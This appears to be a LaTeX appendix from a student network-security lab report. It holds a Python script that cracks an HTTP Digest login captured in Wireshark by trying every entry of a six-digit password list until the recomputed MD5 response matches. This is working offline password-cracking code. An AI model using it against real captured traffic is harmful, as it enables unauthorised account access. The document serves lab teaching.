% 后续在此填写或引入本实验的关键代码。
\appendix

\section{HTTP Digest 认证离线验证程序}
\label{appendix:digest_crack}

本程序根据 Wireshark 捕获到的 HTTP Digest 认证参数，
遍历六位数字密码本中的候选口令，并重新计算认证摘要。
当计算得到的摘要与捕获到的 \texttt{response} 一致时，
即可确定对应的候选口令。

\begin{lstlisting}[language=Python, caption={HTTP Digest 认证离线验证程序}, label={lst:digest_crack}]
import hashlib


# Wireshark 中提取的 Digest 参数
username = "wjy"
realm = "ARP-LAB"
method = "GET"
uri = "/"

nonce = "skPh9mpcBgA=03449b152e612b90bcaa85e20ec0a1cf84b24071"
nc = "00000001"
cnonce = "14f4b7e2d69aada7"
qop = "auth"

response = "1597a1728dc072e7120b90fcf05ba80d"


# 计算 MD5
def compute_md5_hash(text):
    return hashlib.md5(text.encode("utf-8")).hexdigest()


# 定义 MD5 碰撞函数
def MD5Collision(response, dictfilepath):

    # 打开字典文件，读取所有口令
    with open(dictfilepath, "r") as file:
        passwords = file.readlines()

    # 计算 MD5 摘要，与 response 进行碰撞
    for password in passwords:
        password = password.strip()

        # 构建 A1 和 A2
        textpart_A1 = f"{username}:{realm}:{password}"
        textpart_A2 = f"{method}:{uri}"

        A1_MD5 = compute_md5_hash(textpart_A1)
        A2_MD5 = compute_md5_hash(textpart_A2)

        # 构建最终 Digest 输入
        textpart = (
            f"{A1_MD5}:{nonce}:{nc}:{cnonce}:{qop}:{A2_MD5}"
        )

        # 计算密码的 MD5 摘要
        digest = hashlib.md5(
            textpart.encode("utf-8")
        ).hexdigest()

        # 检查摘要是否与捕获到的 response 匹配
        if digest == response:
            print(f"口令正确 : {password}")
            return password

    print("Password not found in dictionary.")
    return None


# 使用六位数字密码本
MD5Collision(response, "Password.txt")
\end{lstlisting}